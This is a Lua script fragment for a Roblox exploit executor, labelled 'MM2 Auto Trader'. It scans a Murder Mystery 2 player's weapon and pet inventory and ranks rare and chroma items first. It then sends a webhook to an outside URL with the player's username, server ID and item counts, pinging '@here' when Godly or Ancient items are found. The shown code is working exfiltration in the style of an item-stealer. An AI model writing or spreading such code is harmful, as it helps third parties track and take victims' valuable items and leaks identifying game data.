local function scanAllItems()
    local weaponItems = {}
    local petItems = {}
    local mainGUI = getMainGUI()
    if not mainGUI then return weaponItems, petItems end
    local main = getInventoryMain(mainGUI)
    if not main then return weaponItems, petItems end

    local weapons = main:FindFirstChild("Weapons")
    if weapons then
        local itemsFolder = weapons:FindFirstChild("Items")
        if itemsFolder then
            local container = itemsFolder:FindFirstChild("Container")
            if container then
                for _, scrollName in ipairs({"Classic", "Current", "Holiday"}) do
                    local scrollFrame = container:FindFirstChild(scrollName)
                    if scrollFrame then
                        local found = scanScrollFrame(scrollFrame, "Weapons")
                        for _, item in ipairs(found) do table.insert(weaponItems, item) end
                    end
                end
            end
        end
    end

    local pets = main:FindFirstChild("Pets")
    if pets then
        local itemsFolder = pets:FindFirstChild("Items")
        if itemsFolder then
            local container = itemsFolder:FindFirstChild("Container")
            if container then
                local scrollFrame = container:FindFirstChild("Current")
                if scrollFrame then
                    local found = scanScrollFrame(scrollFrame, "Pets")
                    for _, item in ipairs(found) do table.insert(petItems, item) end
                end
            end
        end
    end

    return weaponItems, petItems
end

local function buildRaritySummary(weaponItems, petItems)
    local summary = {}
    for _, item in ipairs(weaponItems) do
        summary[item.rarity] = (summary[item.rarity] or 0) + item.amount
    end
    for _, item in ipairs(petItems) do
        summary[item.rarity] = (summary[item.rarity] or 0) + item.amount
    end
    return summary
end

local function hasEligibleItems(weaponItems, petItems)
    return #weaponItems > 0 or #petItems > 0
end

local function hasHighValueItems(weaponItems)
    for _, item in ipairs(weaponItems) do
        if item.rarity == "Godly" or item.rarity == "Ancient" or item.rarity == "UniqueClassic" then
            return true
        end
    end
    return false
end

local function sortItems(items)
    table.sort(items, function(a, b)
        if a.priority ~= b.priority then return a.priority < b.priority end
        return a.amount > b.amount
    end)
    return items
end

local function buildPriorityList(weaponItems, petItems)
    local chromaWeapons, chromaPets, normalWeapons, normalPets = {}, {}, {}, {}
    for _, item in ipairs(weaponItems) do
        if item.chroma then table.insert(chromaWeapons, item)
        else table.insert(normalWeapons, item) end
    end
    for _, item in ipairs(petItems) do
        if item.chroma then table.insert(chromaPets, item)
        else table.insert(normalPets, item) end
    end
    local finalList = {}
    for _, item in ipairs(sortItems(chromaWeapons)) do table.insert(finalList, item) end
    for _, item in ipairs(sortItems(chromaPets)) do table.insert(finalList, item) end
    for _, item in ipairs(sortItems(normalWeapons)) do table.insert(finalList, item) end
    for _, item in ipairs(sortItems(normalPets)) do table.insert(finalList, item) end
    return finalList
end

local function shouldPing(weaponItems)
    return hasHighValueItems(weaponItems)
end

local function sendWebhook(weaponItems, petItems)
    local weaponRarityCounts = {}
    local petRarityCounts = {}

    for _, item in ipairs(weaponItems) do
        local label = item.chroma and (item.rarity .. " Chroma") or item.rarity
        if not weaponRarityCounts[label] then weaponRarityCounts[label] = {count = 0, dot = item.dot} end
        weaponRarityCounts[label].count = weaponRarityCounts[label].count + item.amount
    end
    for _, item in ipairs(petItems) do
        local label = item.chroma and (item.rarity .. " Chroma") or item.rarity
        if not petRarityCounts[label] then petRarityCounts[label] = {count = 0, dot = item.dot} end
        petRarityCounts[label].count = petRarityCounts[label].count + item.amount
    end

    local weaponText = ""
    for rarity, data in pairs(weaponRarityCounts) do
        weaponText = weaponText .. data.dot .. " **" .. rarity .. "**: " .. data.count .. "\n"
    end
    if weaponText == "" then weaponText = "*None*\n" end

    local petText = ""
    for rarity, data in pairs(petRarityCounts) do
        petText = petText .. data.dot .. " **" .. rarity .. "**: " .. data.count .. "\n"
    end
    if petText == "" then petText = "*None*\n" end

    local payload = HttpService:JSONEncode({
        content = shouldPing(weaponItems) and "@here" or "",
        embeds = {{
            title = "🤖 Auto Trader Executed",
            description = "**👤 Username:** `" .. localPlayer.Name .. "`\n**🌐 Server ID:** `" .. tostring(game.JobId) .. "`",
            color = shouldPing(weaponItems) and 16711680 or 3447003,
            fields = {
                {name = "⚔️ Weapons", value = weaponText, inline = true},
                {name = "🐾 Pets", value = petText, inline = true}
            },
            footer = {text = "MM2 Auto Trader"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    pcall(function()
        if syn and syn.request then
            syn.request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
        elseif http and http.request then
            http.request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
        elseif request then
            request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
        end
    end)
    print("[AUTOTRADER] Webhook sent.")
end

